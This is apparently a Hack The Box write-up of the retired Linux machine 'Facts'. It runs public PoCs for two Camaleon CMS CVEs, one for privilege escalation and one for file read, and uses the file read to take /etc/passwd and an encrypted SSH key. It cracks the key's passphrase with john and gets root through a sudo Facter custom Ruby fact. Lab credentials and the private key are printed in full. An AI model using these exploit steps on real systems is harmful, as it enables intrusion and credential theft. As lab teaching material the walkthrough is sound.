---
title: Facts
description: Camaleon CMS exposes a file-read path to an encrypted SSH key, followed
  by sudo Facter custom-fact execution.
platform: Linux
tags:
- Camaleon CMS
- File read
- Facter
htb: https://app.hackthebox.com/machines/829
retirement:
  state: retired
  checked: '2026-11-17'
  evidence: https://labs.hackthebox.com/achievement/machine/2048041/829
---

# Facts

<div class="wu-meta" markdown="span">
<span class="wu-badge wu-os">:fontawesome-brands-linux: Linux</span>
<span class="wu-tags">
<span class="wu-tag">Camaleon CMS</span>
<span class="wu-tag">File read</span>
<span class="wu-tag">Facter</span>
</span>
</div>

!!! abstract "What this box demonstrates"
    The writable object store was an interesting detour, but arbitrary file read provided the route to a shell. After recovering Trivia's encrypted SSH key, I found that Facter could load my Ruby code while running as root.

## Attack path

1. Register in Camaleon CMS and investigate its privilege-escalation and storage exposure.
2. Use the file-read vulnerability to recover Trivia's SSH key and crack its passphrase.
3. Run a custom Ruby fact through the passwordless Facter sudo rule.

[HTB machine](https://app.hackthebox.com/machines/829) · [Official retirement evidence](https://labs.hackthebox.com/achievement/machine/2048041/829) (checked November 17, 2026).

## Overview

First, we add the target IP to `/etc/hosts` so we can access it by hostname:

```bash
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts
```

## Reconnaissance
### Port Scanning

I started with a full TCP scan, then used the discovered web service to guide virtual-host and endpoint enumeration.

```bash
nmap -sC -sV -p- 10.129.244.96 -oN nmap_full.txt
```

**Results:**
```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: facts
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://facts.htb:9001
[redacted for length]
```

The scan found SSH, the main web application, and an HTTP service on 54321 that redirected to port 9001. The Go server banner is an implementation clue, not a separate application protocol.

**Open Ports:**

* **22** - SSH
* **80** - Web Portal 
* **54321** - Golang ?

## Directory Enumeration

Our only real lead at the moment is the web portal, which at first glance doesn't give us much information and therefore our next move is to start scanning for interesting directories, subdirectories, or APIs.

**Subdomains:**
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://facts.htb \
     -H "Host: FUZZ.facts.htb" -ac
```

No results.

**APIs:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u http://facts.htb/FUZZ -ac
```

No results.

**Directory:**
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 http://facts.htb/FUZZ
```

**Results:**
```text
000000003:   302        0 L      0 W        0 Ch        "admin" 
```

Now we have something to work with! Navigate to `http://facts.htb/admin` and notice this redirects to a login page. While we don't have credentials, the site does allow us to register an account.

<figure class="wu-evidence" markdown>
![The CMS admin route redirects to its login page](../assets/images/machines/facts/evidence-01.png)
<figcaption>The CMS admin route redirects to its login page.</figcaption>
</figure>

Register an account with any information and then attempt to login to the dashboard. 

<figure class="wu-evidence" markdown>
![The CMS allows a new account to register](../assets/images/machines/facts/evidence-02.png)
<figcaption>The CMS allows a new account to register.</figcaption>
</figure>

Notice from the dashboard that the application is using Camaleon CMS version 2.9.0.

<figure class="wu-evidence" markdown>
![The authenticated dashboard identifies Camaleon CMS 2.9.0](../assets/images/machines/facts/evidence-03.png)
<figcaption>The authenticated dashboard identifies Camaleon CMS 2.9.0.</figcaption>
</figure>

## CVE-2025-2304

**CVE-2025-2304** is a Privilege Escalation vulnerability which takes advantage of the update password feature where UsersController is called. A public PoC is available on GitHub: https://github.com/Alien0ne/CVE-2025-2304

```bash
python3 exploit.py -u http://facts.htb -U dave -P smith -e
```

<figure class="wu-evidence" markdown>
![The privilege-escalation PoC reports admin access and the lab storage credentials](../assets/images/machines/facts/evidence-04.png)
<figcaption>The privilege-escalation PoC reports admin access and the lab storage credentials.</figcaption>
</figure>

> Note that after this command, I was unable to log in as the `dave` user again, however, it was unnecessary for the rest of the lab.

Exploiting **CVE-2025-2304** exposes **AWS S3** credentials stored in the application’s configuration files. These credentials may allow access to files stored in the site’s storage.

```bash
export AWS_ACCESS_KEY_ID=AKIADC93A991FF1E157D
export AWS_SECRET_ACCESS_KEY=UTlWgy181tcoFRvC8DmQgPnSRai2ibNGzpvN1cFB
```

These credentials belong to the lab's S3-compatible service. Every CLI request below explicitly targets `http://facts.htb:54321`. With those credentials in hand, the next step is enumerating the S3 bucket. Using the AWS CLI, we can list bucket contents and discover what files are stored and whether we can interact with them.

<figure class="wu-evidence" markdown>
![The lab S3-compatible endpoint lists objects in randomfacts](../assets/images/machines/facts/evidence-05.png)
<figcaption>The lab S3-compatible endpoint lists objects in randomfacts.</figcaption>
</figure>

The S3 bucket is writable. We can upload arbitrary files to two paths: **/randomfacts/** and **/randomfacts/thumb/**.

```bash
aws s3 cp ~/Desktop/text.txt s3://randomfacts/ --endpoint-url http://facts.htb:54321
```
> Ensure to have exported the key id and secret key to the terminal before running this command

```bash
aws s3 ls s3://randomfacts/ --endpoint-url http://facts.htb:54321
```

<figure class="wu-evidence" markdown>
![A test object is uploaded to the lab bucket](../assets/images/machines/facts/evidence-06.png)
<figcaption>A test object is uploaded to the lab bucket.</figcaption>
</figure>

After uploading the file, it does not appear in the CMS media browser right away. Because of this, we need to try another method to access or use the uploaded file instead of relying on the media library.

## CVE-2024-46987

Another vulnerability affecting Camaleon CMS 2.9.0 is CVE-2024-46987. This issue allows the server to read files from its own system, which means we can request and view files that should normally not be accessible. This has a publicly available PoC: https://github.com/Goultarde/CVE-2024-46987

The saved commands use different login values for the two PoCs (`dave`/`smith` and `smith`/`dave`). They are preserved as recorded; use the account created in your own run with each tool's actual login options.

```bash
python3 readfile.py -u http://facts.htb -l smith -p dave -v /etc/passwd
```

<figure class="wu-evidence" markdown>
![The file-read PoC returns the target's passwd file](../assets/images/machines/facts/evidence-07.png)
<figcaption>The file-read PoC returns the target&#x27;s passwd file.</figcaption>
</figure>

By reading `/etc/passwd`, we're able to find two users on the system: `trivia` and `williams`. 

### SSH Access via Key Extraction

After identifying two possible users, we use the file read vulnerability to check their home directories and look for SSH keys. In the **trivia** user’s directory, we find both an **authorized_keys** file and a private SSH key called **id_ed25519**, which could allow us to log in as that user.

```bash
python3 readfile.py -u http://facts.htb -l smith -p dave -v /home/trivia/.ssh/authorized_keys

[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBSuZYqqt2UrKOZH2zdwpT48oNZ3kT0FUgXCiMRwFs/n 
```

```bash
python3 readfile.py -u http://facts.htb -l smith -p dave -v /home/trivia/.ssh/id_ed25519     
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDCDZsT91
vW6IMbPbYJ4pjGAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIBSuZYqqt2UrKOZH
2zdwpT48oNZ3kT0FUgXCiMRwFs/nAAAAoMlfyiLQIg+WytEcUP1VhQ7d3AKvrYqRQYr0uc
vLDFE30YDyj6E3l6i4nVvUXfCTAP7DqOvgv/2WXLzR36lgLDteQvrN8z4UNPr1F1DUhKKM
MsxiG0zpZOgc7hpETFKFAn/xBcjS704CiH5V6yfvsgLnCQNT3XVYBFRRXtwoJTS4z9Hhux
Ma0Me0yV1h6Oel29TaFCXl7a01oKgLRz8hbJA=
-----END OPENSSH PRIVATE KEY-----
```

```bash
chmod 600 trivia_ed25519
```
> IMPORTANT! Set permissions of the SSH Key

Unfortunately, the user has put a password on their SSH Key and therefore, if we attempt to use the key as-is, we'll be prompted for that password.

```bash
ssh -i trivia_ed25519 trivia@facts.htb
Enter passphrase for key 'trivia_ed25519':
```

Instead, use SSH2John to create a hash of the SSH Key:
```bash
ssh2john trivia_ed25519 > trivia_hash_ed25519
```

Now, use `john` to crack the hash:
```bash
john trivia_hash_ed25519 --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure class="wu-evidence" markdown>
![John recovers the SSH key passphrase dragonballz](../assets/images/machines/facts/evidence-08.png)
<figcaption>John recovers the SSH key passphrase dragonballz.</figcaption>
</figure>

Now, try to use the SSH Key again and enter the password when prompted:
```bash
ssh -i trivia_ed25519 trivia@facts.htb
Enter passphrase for key 'trivia_ed25519': dragonballz
```

And now we've got our initial access on the machine!

<figure class="wu-evidence" markdown>
![The recovered SSH key authenticates as Trivia](../assets/images/machines/facts/evidence-09.png)
<figcaption>The recovered SSH key authenticates as Trivia.</figcaption>
</figure>

## Privilege Escalation via `/usr/bin/facter`

Notice that our user has the ability to run `/usr/bin/facter` as sudo without a password on this machine.

<figure class="wu-evidence" markdown>
![Trivia can run Facter through sudo without a password](../assets/images/machines/facts/evidence-10.png)
<figcaption>Trivia can run Facter through sudo without a password.</figcaption>
</figure>

Looking at [GTFOBins](https://gtfobins.org/gtfobins/facter/#inherit), we can see that we have a potential path to `root` by exploiting this `facter`.

<figure class="wu-evidence" markdown>
![The Facter reference describes loading Ruby facts from a custom directory](../assets/images/machines/facts/evidence-11.png)
<figcaption>The Facter reference describes loading Ruby facts from a custom directory.</figcaption>
</figure>

```bash
trivia@facts:/home/william$ mkdir /tmp/f
trivia@facts:/home/william$ cat << 'EOF' > /tmp/f/pwn.rb
Facter.add(:pwn) do
  setcode do
    exec "/bin/bash"
  end
end
EOF
trivia@facts:/home/william$ sudo /usr/bin/facter --custom-dir=/tmp/f
root@facts:/home/william# cat /root/root.txt
[flag omitted]
```

Because I was allowed to run **`facter`** as root with `sudo`, I was able to abuse the way it loads custom facts. Facter is a Ruby-based tool used by Puppet that can load additional fact files written in Ruby. Even though `sudo` blocked environment variables like `RUBYLIB` and `FACTERLIB`, the binary still allowed the `--custom-dir` argument. I created a malicious Ruby fact that executed `/bin/bash` and pointed `facter` to the directory containing it with `sudo facter --custom-dir=/tmp/f`. When `facter` loaded the custom fact, the Ruby code executed as root and spawned a root shell, giving me full privilege escalation.

## Lessons learned

The object-store detour demonstrated writable storage, but the file-read primitive delivered SSH access. Facter's explicit custom-directory option still crossed the privilege boundary even when sudo restricted environment variables.
